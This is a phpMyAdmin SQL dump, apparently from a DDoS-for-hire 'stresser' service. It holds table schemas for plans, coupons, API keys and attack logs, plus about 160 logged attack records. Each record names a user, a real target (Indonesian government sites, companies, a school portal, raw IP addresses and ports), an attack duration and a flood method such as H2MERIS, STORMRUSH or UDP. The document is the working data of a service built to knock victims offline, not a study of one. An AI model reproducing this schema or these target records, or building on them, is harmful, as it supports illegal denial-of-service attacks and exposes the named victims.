-- phpMyAdmin SQL Dump
-- version 5.2.2
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Waktu pembuatan: 24 Apr 2025 pada 13.36
-- Versi server: 10.11.11-MariaDB
-- Versi PHP: 8.3.19

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `yoshistr_stresser`
--

-- --------------------------------------------------------

--
-- Struktur dari tabel `addons`
--

CREATE TABLE `addons` (
  `id` int(11) NOT NULL,
  `user` varchar(255) NOT NULL,
  `price` int(11) NOT NULL,
  `concs` int(11) NOT NULL,
  `attacktime` int(11) NOT NULL,
  `blacklist` int(11) NOT NULL,
  `apiaccess` int(11) NOT NULL,
  `premium` int(11) NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `addon_coupons`
--

CREATE TABLE `addon_coupons` (
  `id` int(11) NOT NULL,
  `code` varchar(255) NOT NULL,
  `percent` int(11) NOT NULL,
  `created_at` datetime NOT NULL,
  `expire_at` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `apikeys`
--

CREATE TABLE `apikeys` (
  `id` int(11) NOT NULL,
  `user` varchar(255) NOT NULL,
  `api_key` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `attacklogs`
--

CREATE TABLE `attacklogs` (
  `id` int(11) NOT NULL,
  `user` varchar(255) NOT NULL,
  `target` varchar(255) NOT NULL,
  `port` int(11) NOT NULL,
  `time` int(11) NOT NULL,
  `method` varchar(255) NOT NULL,
  `concs` int(11) NOT NULL,
  `stopped` int(11) NOT NULL,
  `servers` varchar(255) NOT NULL,
  `premium` int(11) NOT NULL,
  `apiattack` int(11) NOT NULL,
  `date` int(11) NOT NULL,
  `datetime` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

--
-- Dumping data untuk tabel `attacklogs`
--

INSERT INTO `attacklogs` (`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `datetime`) VALUES
(268363, 'Cas171945', 'https://milanbarmozzarella30.com/', 80, 80, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1743891383, '2025-04-06 00:16:23'),
(268364, 'Cas171945', 'https://milanbarmozzarella30.com/', 80, 80, 'H2FLASH', 1, 0, 'H2FLASH', 1, 0, 1743891472, '2025-04-06 00:17:52'),
(268365, 'Cas171945', 'https://www.jasaotp.id/', 80, 80, 'H2FLASH', 1, 0, 'H2FLASH', 1, 0, 1743938593, '2025-04-06 13:23:13'),
(268366, 'Cas171945', 'https://www.jasaotp.id/', 80, 80, 'HYPERBLAST', 1, 0, 'HYPERBLAST', 1, 0, 1743938771, '2025-04-06 13:26:11'),
(268367, 'xxxcel', 'https://alfagift.id/', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1743940780, '2025-04-06 13:59:40'),
(268368, 'xxxcel', 'https://www.fcbarcelona.com/en/', 80, 120, 'H2FLASH', 1, 0, 'H2FLASH', 1, 0, 1743941097, '2025-04-06 14:04:57'),
(268369, 'xxxcel', '185.207.164.7', 53, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1743948409, '2025-04-06 16:06:49'),
(268370, 'xxxcel', '185.207.164.104', 53, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1743948593, '2025-04-06 16:09:53'),
(268371, 'xxxcel', '185.207.164.104', 53, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1743948668, '2025-04-06 16:11:08'),
(268372, 'xxxcel', '185.207.164.104', 53, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1743948741, '2025-04-06 16:12:21'),
(268373, 'xxxcel', '15.235.164.195', 53, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1743949066, '2025-04-06 16:17:46'),
(268374, 'xxxcel', '15.235.164.195', 53, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1743949132, '2025-04-06 16:18:52'),
(268375, 'xxxcel', 'https://ip-count.dstat.uk/', 80, 200, 'H2BYPASS', 1, 0, 'H2BYPASS', 0, 0, 1743951035, '2025-04-06 16:50:35'),
(268376, 'xxxcel', 'https://ip-count.dstat.uk/', 80, 180, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1743951414, '2025-04-06 16:56:54'),
(268377, 'xxxcel', 'https://www.todshop.id/id-id', 80, 120, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1743952163, '2025-04-06 17:09:23'),
(268378, 'xxxcel', '104.21.17.204', 53, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1743953710, '2025-04-06 17:35:10'),
(268379, 'xxxcel', '185.128.227.174', 53, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1743979657, '2025-04-07 00:47:37'),
(268380, 'Cas171945', 'https://www.britannica.com/', 80, 80, 'HTTPS', 1, 0, 'HTTPS', 0, 0, 1743997977, '2025-04-07 05:52:57'),
(268381, 'Cas171945', 'https://komiku.ae/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1743998482, '2025-04-07 06:01:22'),
(268382, 'Cas171945', 'https://pentestgpt.ai/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1743998965, '2025-04-07 06:09:25'),
(268383, 'Cas171945', 'https://fajar.co.id/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1743999425, '2025-04-07 06:17:05'),
(268384, 'Cas171945', 'https://drooosk.com/', 80, 80, 'H2BYPASS', 1, 0, 'H2BYPASS', 0, 0, 1743999936, '2025-04-07 06:25:36'),
(268385, 'kavern77', 'https://masukgalaxy.com', 80, 60, 'TLS', 2, 0, 'TLS', 0, 0, 1744004591, '2025-04-07 07:43:11'),
(268386, 'kavern77', 'https://masukgalaxy.com', 80, 60, 'TLS', 2, 0, 'TLS', 0, 0, 1744004591, '2025-04-07 07:43:11'),
(268387, 'kavern77', 'https://masukgalaxy.com', 80, 60, 'TLS', 1, 0, 'TLS', 0, 0, 1744004733, '2025-04-07 07:45:33'),
(268388, 'Cas171945', '45.59.168.29', 53, 120, 'UDP', 1, 0, 'UDP', 1, 0, 1744005230, '2025-04-07 07:53:50'),
(268389, 'Cas171945', '185.223.207.58', 19132, 120, 'UDP', 1, 0, 'UDP', 1, 0, 1744005624, '2025-04-07 08:00:24'),
(268390, 'kavern77', 'https://masukgalaxy.com', 80, 30, 'H2MERIS', 1, 0, 'H2MERIS', 1, 1, 1744009795, '2025-04-07 09:09:55'),
(268391, 'kavern77', 'https://masukgalaxy.com', 80, 30, 'H2MERIS', 1, 0, 'H2MERIS', 1, 1, 1744010226, '2025-04-07 09:17:06'),
(268392, 'kavern77', 'https://v3.tiktokcdn.com', 80, 120, 'H2BYPASS', 1, 0, 'H2BYPASS', 0, 0, 1744012356, '2025-04-07 09:52:36'),
(268393, 'painzy', 'http://miaothecat.com', 80, 120, 'H2BYPASS', 1, 0, 'H2BYPASS', 0, 0, 1744023997, '2025-04-07 13:06:37'),
(268394, 'xxxcel', 'https://negrotm.com/', 80, 120, 'HYPERBLAST', 1, 0, 'HYPERBLAST', 1, 0, 1744030779, '2025-04-07 14:59:39'),
(268395, 'xxxcel', 'https://id.theasianparent.com/', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744031039, '2025-04-07 15:03:59'),
(268396, 'xxxcel', 'https://www.medcom.id/', 80, 120, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1744031772, '2025-04-07 15:16:12'),
(268397, 'xxxcel', 'https://www.bandung.go.id/', 80, 120, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1744031986, '2025-04-07 15:19:46'),
(268398, 'xxxcel', 'https://etd.repository.ugm.ac.id/', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744032187, '2025-04-07 15:23:07'),
(268399, 'xxxcel', '161.202.207.173', 2001, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744035538, '2025-04-07 16:18:58'),
(268400, 'Cas171945', 'https://client.qrator.net/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744037822, '2025-04-07 16:57:02'),
(268401, 'Cas171945', 'https://pentestgpt.ai/', 80, 80, 'H2FLASH', 1, 0, 'H2FLASH', 1, 0, 1744038805, '2025-04-07 17:13:25'),
(268402, 'Cas171945', 'https://pentestgpt.ai/', 80, 80, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744038888, '2025-04-07 17:14:48'),
(268403, 'Jose639', 'https://hfzactivator.com', 80, 500, 'HYPERBLAST', 4, 0, 'HYPERBLAST', 1, 0, 1744051594, '2025-04-07 20:46:34'),
(268404, 'Jose639', 'https://hfzactivator.com', 80, 500, 'HYPERBLAST', 4, 0, 'HYPERBLAST', 1, 0, 1744051595, '2025-04-07 20:46:35'),
(268405, 'Jose639', 'https://hfzactivator.com', 80, 500, 'HYPERBLAST', 4, 0, 'HYPERBLAST', 1, 0, 1744051595, '2025-04-07 20:46:35'),
(268406, 'Jose639', 'https://hfzactivator.com', 80, 500, 'HYPERBLAST', 4, 0, 'HYPERBLAST', 1, 0, 1744051595, '2025-04-07 20:46:35'),
(268407, 'Jose639', 'https://hfzactivator.com/', 80, 300, 'JOUMA', 1, 0, 'JOUMA', 0, 0, 1744052365, '2025-04-07 20:59:25'),
(268408, 'Jose639', 'https://hfzactivator.com/', 80, 300, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1744052375, '2025-04-07 20:59:35'),
(268409, 'Jose639', 'https://hfzactivator.com/', 80, 300, 'H2FLASH', 1, 0, 'H2FLASH', 1, 0, 1744052387, '2025-04-07 20:59:47'),
(268410, 'Jose639', 'https://hfzactivator.com/', 80, 300, 'H2FLASH', 1, 0, 'H2FLASH', 1, 0, 1744052409, '2025-04-07 21:00:09'),
(268411, 'kavern77', 'https://hfzactivator.com/', 80, 120, 'H2BYPASS', 1, 0, 'H2BYPASS', 0, 0, 1744055532, '2025-04-07 21:52:12'),
(268412, 'kavern77', 'https://hfzactivator.com/', 80, 120, 'JOUMA', 1, 0, 'JOUMA', 0, 0, 1744055696, '2025-04-07 21:54:56'),
(268413, 'kavern77', 'https://hfzactivator.com/#google_vignette', 80, 80, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1744056002, '2025-04-07 22:00:02'),
(268414, 'xxxcel', '47.89.121.63', 5503, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744082666, '2025-04-08 05:24:26'),
(268415, 'xxxcel', '47.89.121.63', 5503, 60, 'TCP', 1, 0, 'TCP', 1, 0, 1744082751, '2025-04-08 05:25:51'),
(268416, 'xxxcel', '47.89.121.63', 5503, 60, 'TCP', 1, 0, 'TCP', 1, 0, 1744083001, '2025-04-08 05:30:01'),
(268417, 'xxxcel', '47.89.121.63', 5503, 60, 'TCP', 1, 0, 'TCP', 1, 0, 1744083196, '2025-04-08 05:33:16'),
(268418, 'xxxcel', '47.89.121.63', 5503, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744083307, '2025-04-08 05:35:07'),
(268419, 'Cas171945', '66.90.99.114', 53, 90, 'UDP', 1, 0, 'UDP', 1, 0, 1744083574, '2025-04-08 05:39:34'),
(268420, 'xxxcel', 'https://safelinku.com/', 80, 120, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1744115127, '2025-04-08 14:25:27'),
(268421, 'xxxcel', 'https://www.accuweather.com/', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744115939, '2025-04-08 14:38:59'),
(268422, 'xxxcel', 'https://www.presidenri.go.id/', 80, 120, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1744116212, '2025-04-08 14:43:32'),
(268423, 'xxxcel', 'https://www.sea.com/', 80, 120, 'HYPERBLAST', 1, 0, 'HYPERBLAST', 1, 0, 1744116652, '2025-04-08 14:50:52'),
(268424, 'xxxcel', 'https://ip-count.dstat.uk/', 80, 120, 'H2NEYLI', 1, 0, 'H2NEYLI', 1, 0, 1744117218, '2025-04-08 15:00:18'),
(268425, 'xxxcel', 'https://unprot-cloudflare.dstatbot.org/7e10b0e8-2efc-4ce6-b97a-cf0accbbcb3e', 80, 200, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1744121807, '2025-04-08 16:16:47'),
(268426, 'xxxcel', 'https://ip-count.dstat.uk/', 80, 200, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744122168, '2025-04-08 16:22:48'),
(268427, 'xxxcel', 'https://ip-count.dstat.uk/', 80, 200, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744180384, '2025-04-09 08:33:04'),
(268428, 'xxxcel', '156.59.92.178', 5504, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744182474, '2025-04-09 09:07:54'),
(268429, 'xxxcel', '156.59.92.178', 5504, 60, 'TCP', 1, 0, 'TCP', 1, 0, 1744182635, '2025-04-09 09:10:35'),
(268430, 'xxxcel', '156.59.92.178', 5504, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744182874, '2025-04-09 09:14:34'),
(268431, 'xxxcel', '156.59.92.158', 5504, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744183722, '2025-04-09 09:28:42'),
(268432, 'xxxcel', '156.59.92.158', 5504, 60, 'TCP', 1, 0, 'TCP', 1, 0, 1744183847, '2025-04-09 09:30:47'),
(268433, 'xxxcel', '156.59.92.158', 5504, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744184090, '2025-04-09 09:34:50'),
(268434, 'xxxcel', '45.198.232.18', 5005, 30, 'UDP', 1, 0, 'UDP', 1, 0, 1744245217, '2025-04-10 02:33:37'),
(268435, 'xxxcel', '45.198.232.16', 5013, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744258176, '2025-04-10 06:09:36'),
(268436, 'xxxcel', '45.198.232.16', 5013, 60, 'TCP', 1, 0, 'TCP', 1, 0, 1744258495, '2025-04-10 06:14:55'),
(268437, 'Cas171945', '209.38.92.217', 53, 120, 'UDP', 1, 0, 'UDP', 1, 0, 1744300771, '2025-04-10 17:59:31'),
(268438, 'Cas171945', '15.235.181.105', 25587, 120, 'UDP', 1, 0, 'UDP', 1, 0, 1744369295, '2025-04-11 13:01:35'),
(268439, 'yoshi77', 'https://pointgo.id/', 80, 120, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1744381561, '2025-04-11 16:26:01'),
(268440, 'yoshi77', 'https://pointgo.id/', 80, 120, 'TLS', 1, 0, 'TLS', 0, 0, 1744381624, '2025-04-11 16:27:04'),
(268441, 'yoshi77', 'https://pointgo.id/', 80, 130, 'JOUMA', 1, 0, 'JOUMA', 0, 0, 1744381743, '2025-04-11 16:29:03'),
(268442, 'yoshi77', 'https://pointgo.id/', 80, 130, 'JOUMA', 1, 0, 'JOUMA', 0, 0, 1744381937, '2025-04-11 16:32:17'),
(268443, 'xxxcel', 'https://www.merriam-webster.com', 80, 120, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1744443644, '2025-04-12 09:40:44'),
(268444, 'xxxcel', 'https://prabowosubianto.com', 80, 120, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1744443915, '2025-04-12 09:45:15'),
(268445, 'xxxcel', 'https://setkab.go.id', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744444566, '2025-04-12 09:56:06'),
(268446, 'kavern77', 'https://onlyfiest.com.tr/', 80, 500, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1744446504, '2025-04-12 10:28:24'),
(268447, 'kavern77', 'https://api.ldcex26.com/api/app/user/login', 80, 500, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1744447529, '2025-04-12 10:45:29'),
(268448, 'xxxcel', 'https://ip-count.dstat.uk/', 80, 200, 'H2BYPASS', 1, 0, 'H2BYPASS', 0, 0, 1744465618, '2025-04-12 15:46:58'),
(268449, 'xxxcel', 'https://dstat.countbot.uk/', 80, 200, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744465924, '2025-04-12 15:52:04'),
(268450, 'Cas171945', 'https://dstat.countbot.uk/', 80, 250, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744467542, '2025-04-12 16:19:02'),
(268451, 'xxxcel', 'https://request.countbot.win/', 80, 200, 'H2NEYLI', 1, 0, 'H2NEYLI', 1, 0, 1744476942, '2025-04-12 18:55:42'),
(268452, 'xxxcel', '47.89.121.13', 5504, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744520029, '2025-04-13 06:53:49'),
(268453, 'xxxcel', 'https://ip-count.dstat.uk/', 80, 200, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1744555689, '2025-04-13 16:48:09'),
(268454, 'xxxcel', 'https://optifine.net', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744556109, '2025-04-13 16:55:09'),
(268455, 'xxxcel', 'https://www.whatsapp.com/', 80, 120, 'H2NEYLI', 1, 0, 'H2NEYLI', 1, 0, 1744556721, '2025-04-13 17:05:21'),
(268456, 'xxxcel', 'https://www.allrecipes.com', 80, 120, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1744639161, '2025-04-14 15:59:21'),
(268457, 'yoshi77', 'https://bpkpenaburdigilearn.or.id/', 80, 120, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1744676181, '2025-04-15 02:16:21'),
(268458, 'yoshi77', 'https://bpkpenaburdigilearn.or.id/', 80, 120, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1744676342, '2025-04-15 02:19:02'),
(268459, 'Cas171945', 'https://docs.google.com/forms/d/e/1FAIpQLSfFav7cwEyGKqEKKSL3Fvwbg05Z0CIZbN9VZ3URfpmy6FS9Rw/viewform?usp=send_form', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744770345, '2025-04-16 04:25:45'),
(268460, 'Cas171945', 'https://www.duolingo.com/', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744771721, '2025-04-16 04:48:41'),
(268461, 'xxxcel', 'https://lms.sman3jombang.sch.id', 80, 200, 'HYPERBLAST', 1, 0, 'HYPERBLAST', 1, 0, 1744776630, '2025-04-16 06:10:30'),
(268462, 'Cas171945', '95.173.206.81', 53, 100, 'UDP', 1, 0, 'UDP', 1, 0, 1744781263, '2025-04-16 07:27:43'),
(268463, 'Cas171945', '202.165.126.21', 53, 100, 'UDP', 1, 0, 'UDP', 1, 0, 1744806563, '2025-04-16 14:29:23'),
(268464, 'yoshi77', 'https://request.layer7dstat.uk/', 80, 260, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744808533, '2025-04-16 15:02:13'),
(268465, 'yoshi77', 'https://ip-count.dstat.uk/', 80, 260, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744808832, '2025-04-16 15:07:12'),
(268466, 'Cas171945', 'https://www.duolingo.com/', 80, 90, 'H2NEYLI', 1, 0, 'H2NEYLI', 1, 0, 1744851236, '2025-04-17 02:53:56'),
(268467, 'yoshi77', 'https://countbot.lol/1338954214-5b77dcfc-2370-4434-9d11-dcc118ab107a', 80, 245, 'H2NEYLI', 1, 0, 'H2NEYLI', 1, 0, 1744866123, '2025-04-17 07:02:03'),
(268468, 'yoshi77', 'https://uam.dstatbot.org/0f1f2782-810d-431c-b06e-3f8d452af40d', 80, 260, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1744876592, '2025-04-17 09:56:32'),
(268469, 'xxxcel', '95.173.206.81', 53, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744888994, '2025-04-17 13:23:14'),
(268470, 'xxxcel', '156.59.92.202', 5520, 60, 'UDP', 1, 0, 'UDP', 1, 0, 1744890292, '2025-04-17 13:44:52'),
(268471, 'xxxcel', '156.59.92.202', 5520, 60, 'TCP', 1, 0, 'TCP', 1, 0, 1744890508, '2025-04-17 13:48:28'),
(268472, 'kahfimoodtzyy', '31.14.134.130', 80, 120, 'UDP', 1, 0, 'UDP', 1, 0, 1744896741, '2025-04-17 15:32:21'),
(268473, 'kahfimoodtzyy', 'https://primexuu.pteropanelku.biz.id/auth/login', 80, 60, 'H2BYPASS', 1, 0, 'H2BYPASS', 0, 0, 1744896903, '2025-04-17 15:35:03'),
(268474, 'kahfimoodtzyy', 'https://primexuu.pteropanelku.biz.id/auth/login', 80, 120, 'FLOOD', 1, 0, 'FLOOD', 0, 0, 1744897079, '2025-04-17 15:37:59'),
(268475, 'kahfimoodtzyy', 'https://primexuu.pteropanelku.biz.id', 80, 120, 'H2BYPASS', 1, 0, 'H2BYPASS', 0, 0, 1744897259, '2025-04-17 15:40:59'),
(268476, 'kavern77', 'https://anomalystress.shop/login', 80, 500, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1744916405, '2025-04-17 21:00:05'),
(268477, 'kavern77', 'https://anomalystress.shop/login', 80, 50, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744916425, '2025-04-17 21:00:25'),
(268478, 'kavern77', 'https://anomalystress.shop/login', 80, 300, 'RAPID', 1, 0, 'Rapid', 1, 0, 1744916464, '2025-04-17 21:01:04'),
(268479, 'yoshi77', 'https://unprot-cloudflare.dstatbot.org/0f3437dd-5b63-4183-b995-721a24740f02', 80, 260, 'QUANTUM', 1, 0, 'Quantum', 1, 0, 1744943169, '2025-04-18 04:26:09'),
(268480, 'Cas171945', 'https://login.yahoo.com/', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744945956, '2025-04-18 05:12:36'),
(268481, 'yoshi77', 'https://high-cloudflare.dstatbot.org/e0c28f98-012c-46ae-93f9-b650dc5a3cf4', 80, 260, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744948960, '2025-04-18 06:02:40'),
(268482, 'yoshi77', 'https://uam.dstatbot.org/5f1aafc2-b0dc-493b-a98f-4c1ab3c98110', 80, 260, 'BROWSERV2', 1, 0, 'BROWSERV2', 1, 0, 1744949508, '2025-04-18 06:11:48'),
(268483, 'yoshi77', 'https://uam.dstatbot.org/77212b0f-7b44-4a48-931c-ec1101944e99', 80, 260, 'VSE', 1, 0, 'VSE', 1, 0, 1744949816, '2025-04-18 06:16:56'),
(268484, 'yoshi77', 'https://uam.dstatbot.org/fb913f8d-b2d5-4eef-9bdf-4b7d3082a142', 80, 260, 'QUANTUM', 1, 0, 'Quantum', 1, 0, 1744950171, '2025-04-18 06:22:51'),
(268485, 'kavern77', 'https://growbit.net/', 80, 300, 'STORMBYPASS', 2, 0, 'STORMBYPASS', 0, 0, 1744957065, '2025-04-18 08:17:45'),
(268486, 'kavern77', 'https://growbit.net/', 80, 300, 'STORMBYPASS', 2, 0, 'STORMBYPASS', 0, 0, 1744957065, '2025-04-18 08:17:45'),
(268487, 'kavern77', 'https://growbit.net/', 80, 300, 'HYPERBLAST', 1, 0, 'HYPERBLAST', 1, 0, 1744957343, '2025-04-18 08:22:23'),
(268488, 'kavern77', 'https://growbit.net/', 80, 300, 'STORMBYPASS', 1, 0, 'STORMBYPASS', 0, 0, 1744957531, '2025-04-18 08:25:31'),
(268489, 'kavern77', 'https://growbit.net/', 80, 300, 'STORMBYPASS', 1, 0, 'STORMBYPASS', 0, 0, 1744958204, '2025-04-18 08:36:44'),
(268490, 'kavern77', 'https://growbit.net/', 80, 300, 'STORMBYPASS', 1, 0, 'STORMBYPASS', 0, 0, 1744958534, '2025-04-18 08:42:14'),
(268491, 'yoshi77', 'https://dstat.countbot.uk/', 80, 260, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1744961929, '2025-04-18 09:38:49'),
(268492, 'kavern77', 'https://dstat.ws/cin4e59', 80, 180, 'QUANTUM', 1, 0, 'Quantum', 1, 0, 1744983589, '2025-04-18 15:39:49'),
(268493, 'Cas171945', 'https://rangzanticolong.serverbytraa.my.id', 80, 80, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1745026288, '2025-04-19 03:31:28'),
(268494, 'Cas171945', '167.71.190.146', 53, 100, 'UDP', 1, 0, 'UDP', 1, 0, 1745026386, '2025-04-19 03:33:06'),
(268495, 'Cas171945', 'https://login.yahoo.com/', 80, 80, 'HYPERBLAST', 1, 0, 'HYPERBLAST', 1, 0, 1745039297, '2025-04-19 07:08:17'),
(268496, 'Cas171945', 'https://www.transtv.co.id/', 80, 80, 'HTTPS', 1, 0, 'HTTPS', 0, 0, 1745042588, '2025-04-19 08:03:08'),
(268497, 'Cas171945', '146.190.86.109', 53, 100, 'UDP', 1, 0, 'UDP', 1, 0, 1745043392, '2025-04-19 08:16:32'),
(268498, 'Cas171945', 'https://painzy.web.id/', 80, 120, 'RAPID', 1, 0, 'Rapid', 1, 0, 1745045063, '2025-04-19 08:44:23'),
(268499, 'Cas171945', 'https://jewishinsider.com/', 80, 80, 'MIX', 1, 0, 'MIX', 0, 0, 1745045387, '2025-04-19 08:49:47'),
(268500, 'Cas171945', '157.230.249.50', 53, 80, 'UDP', 1, 0, 'UDP', 1, 0, 1745046161, '2025-04-19 09:02:41'),
(268501, 'yoshi77', 'https://request.layer7dstat.uk/', 80, 260, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745048500, '2025-04-19 09:41:40'),
(268502, 'yoshi77', 'https://ip-count.dstat.uk/', 80, 260, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745049170, '2025-04-19 09:52:50'),
(268503, 'yoshi77', 'https://ip-count.dstat.uk/', 80, 260, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745049622, '2025-04-19 10:00:22'),
(268504, 'yoshi77', 'https://captcha.count123.org/', 80, 180, 'BROWSERV2', 1, 0, 'BROWSERV2', 1, 0, 1745051499, '2025-04-19 10:31:39'),
(268505, 'yoshi77', 'https://captcha.count123.org/', 80, 180, 'BROWSER', 1, 0, 'BROWSERV2', 1, 0, 1745051707, '2025-04-19 10:35:07'),
(268506, 'yoshi77', 'https://uam.dstatbot.org/2a6b10c5-42fd-402c-9410-29f35a44b909', 80, 260, 'BROWSERV2', 1, 0, 'BROWSERV2', 1, 0, 1745052048, '2025-04-19 10:40:48'),
(268507, 'yoshi77', 'https://uam.dstatbot.org/3b4a1ad3-9a30-47e1-8a3c-bdfee4518ab2', 80, 260, 'QUANTUM', 1, 0, 'Quantum', 1, 0, 1745052343, '2025-04-19 10:45:43'),
(268508, 'yoshi77', 'https://captcha-1.dstatbot.org/3157c66e-5e73-41f7-8004-509b925a5f03', 80, 260, 'VSE', 1, 0, 'VSE', 1, 0, 1745052708, '2025-04-19 10:51:48'),
(268509, 'yoshi77', 'https://captcha-1.dstatbot.org/3157c66e-5e73-41f7-8004-509b925a5f03', 80, 260, 'VSE', 1, 0, 'VSE', 1, 0, 1745052717, '2025-04-19 10:51:57'),
(268510, 'yoshi77', 'https://captcha-1.dstatbot.org/55f454f2-fd3e-41ba-8304-aa7e3e77dad0', 80, 260, 'BROWSER', 1, 0, 'BROWSER', 1, 0, 1745053161, '2025-04-19 10:59:21'),
(268511, 'yoshi77', 'https://captcha-1.dstatbot.org/9c504d68-2604-4ba3-82d6-426776a6392d', 80, 260, 'BROWSERV2', 1, 0, 'BROWSERV2', 1, 0, 1745053648, '2025-04-19 11:07:28'),
(268512, 'yoshi77', 'https://dstat.ws/75r9f1h', 80, 180, 'VSE', 1, 0, 'VSE', 1, 0, 1745053985, '2025-04-19 11:13:05'),
(268513, 'yoshi77', 'https://dstat.ws/75r9f1h', 80, 180, 'VSE', 1, 0, 'VSE', 1, 0, 1745054187, '2025-04-19 11:16:27'),
(268514, 'xxxcel', 'https://www.tripadvisor.co.id', 80, 120, 'RAPID', 1, 0, 'Rapid', 1, 0, 1745063897, '2025-04-19 13:58:17'),
(268515, 'xxxcel', 'https://nilaigizi.com/', 80, 120, 'HYPERBLAST', 1, 0, 'HYPERBLAST', 1, 0, 1745064277, '2025-04-19 14:04:37'),
(268516, 'xxxcel', 'https://www.pajak.go.id/', 80, 120, 'H2MERIS', 1, 0, 'H2MERIS', 1, 0, 1745064865, '2025-04-19 14:14:25'),
(268517, 'eunsoobf', 'https://seakun.id/', 80, 60, 'TLS', 1, 0, 'TLS', 0, 0, 1745074589, '2025-04-19 16:56:29'),
(268518, 'Cas171945', 'https://www.cloudflare.com/', 80, 120, 'HYPERBLAST', 1, 0, 'HYPERBLAST', 1, 0, 1745112980, '2025-04-20 03:36:20'),
(268519, 'Cas171945', 'http://pixelcut.ai/', 80, 80, 'TLS', 1, 0, 'TLS', 0, 0, 1745120581, '2025-04-20 05:43:01'),
(268520, 'kavern77', 'https://aeza.net/', 80, 300, 'STORMRUSH', 1, 0, 'STORMRUSH', 1, 0, 1745126952, '2025-04-20 07:29:12'),
(268521, 'Cas171945', 'https://centrum.lkpp.go.id/', 80, 80, 'MIXBILL', 1, 0, 'MIXBILL', 0, 0, 1745148236, '2025-04-20 13:23:56'),
